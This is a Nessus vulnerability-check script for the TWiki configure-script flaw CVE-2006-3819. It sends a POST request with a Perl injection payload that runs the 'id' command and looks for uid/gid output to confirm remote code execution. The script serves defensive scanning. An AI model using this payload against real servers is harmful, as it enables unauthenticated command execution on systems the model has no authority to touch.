#
# (C) Tenable Network Security
#

include("compat.inc");

if (description)
{
  script_id(22123);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-3819");
  script_bugtraq_id(19188);
  script_xref(name:"OSVDB", value:"27556");

  script_name(english:"TWiki configure Script Arbitrary Command Execution");
  script_summary(english:"Tries to run a command using TWiki");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server includes a CGI script that allows for arbitrary
code execution." );
 script_set_attribute(attribute:"description", value:
"The version of TWiki installed on the remote host uses an unsafe
'eval' in the 'bin/configure' script that can be exploited by an
unauthenticated attacker to execute arbitrary Perl code subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlertCmdExecWithConfigure" );
 script_set_attribute(attribute:"solution", value:
"Apply HotFix 2 or later for TWiki 4.0.4 or restrict access to the
TWiki configure script." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("twiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);

# Test an install.
install = get_kb_item(string("www/", port, "/twiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  url = string(dir, "/bin/configure");

  # Check whether the affected script exists.
  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # If it does...
  if ('name="action" value="update"' >< res)
  {
    # Try to exploit the flaw to run a command.
    cmd = "id";
    sploit = string("TYPEOF:);system(", cmd, ");my @a=(");
    postdata = string(
      "action=update&",
      urlencode(str:sploit), "=nessus"
    );
    w = http_send_recv3(method: "POST ", item: url, port: port,
      content_type: "application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # There's a problem if we see the code in the XML debug output.
    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host.\n",
          "It produced the following output :\n",
          "\n",
          line
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
